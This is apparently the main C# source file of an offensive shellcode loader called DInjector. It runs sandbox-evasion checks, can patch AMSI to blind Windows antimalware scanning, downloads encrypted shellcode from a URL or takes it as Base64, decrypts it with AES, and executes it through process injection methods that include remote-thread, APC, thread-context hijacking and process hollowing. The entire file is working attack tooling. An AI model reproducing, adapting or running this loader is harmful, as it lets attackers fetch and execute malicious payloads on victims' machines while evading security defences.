using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace DInjector
{
    class Detonator
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect,
            UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern void Sleep(
            uint dwMilliseconds);

        static void Boom(string[] args)
        {
            // Check if we're in a sandbox by calling a rare-emulated API
            IntPtr mem = VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
                return;
            }

            // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
            var rand = new Random();
            uint dream = (uint)rand.Next(2000, 3000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                Console.WriteLine("(Sleep) [-] Failed check");
                return;
            }

            var options = ArgumentParser.Parse(args);

            // Bypass AMSI
            try
            {
                if (string.Equals(options["/am51"], "true", StringComparison.OrdinalIgnoreCase))
                {
                    AM51.Patch();
                }
            }
            catch (Exception)
            { }

            var commandName = string.Empty;
            foreach (KeyValuePair<string, string> item in options)
            {
                if (item.Value == string.Empty)
                {
                    commandName = item.Key;
                }
            }

            var shellcodePath = options["/sc"];
            var password = options["/password"];

            byte[] shellcodeBytesEnc;
            if (shellcodePath.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                Console.WriteLine("(Detonator) [*] Loading sc from URL");
                WebClient wc = new WebClient();
                ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | (SecurityProtocolType)768 | (SecurityProtocolType)3072;
                MemoryStream ms = new MemoryStream(wc.DownloadData(shellcodePath));
                BinaryReader br = new BinaryReader(ms);
                shellcodeBytesEnc = br.ReadBytes(Convert.ToInt32(ms.Length));
            }
            else
            {
                Console.WriteLine("(Detonator) [*] Loading sc from Base64 input");
                shellcodeBytesEnc = Convert.FromBase64String(shellcodePath);
            }

            AES ctx = new AES(password);
            var shellcodeBytesDec = ctx.Decrypt(shellcodeBytesEnc);

            switch (commandName)
            {
                case "functionpointer":
                    FunctionPointer.Execute(shellcodeBytesDec);
                    break;
                case "functionpointerv2":
                    FunctionPointerV2.Execute(shellcodeBytesDec);
                    break;
                case "currentthread":
                    CurrentThread.Execute(shellcodeBytesDec);
                    break;
                case "remotethread":
                    var processID = int.Parse(options["/pid"]);
                    RemoteThread.Execute(shellcodeBytesDec, processID);
                    break;
                case "remotethreadsuspended":
                    var processIDSuspended = int.Parse(options["/pid"]);
                    RemoteThreadSuspended.Execute(shellcodeBytesDec, processIDSuspended);
                    break;
                case "remotethreadapc":
                    var processImageAPC = options["/image"];
                    RemoteThreadAPC.Execute(shellcodeBytesDec, processImageAPC);
                    break;
                case "remotethreadcontext":
                    var processImageContext = options["/image"];
                    RemoteThreadContext.Execute(shellcodeBytesDec, processImageContext);
                    break;
                case "processhollow":
                    var processImageHollow = options["/image"];
                    ProcessHollow.Execute(shellcodeBytesDec, processImageHollow);
                    break;
            }
        }
    }
}
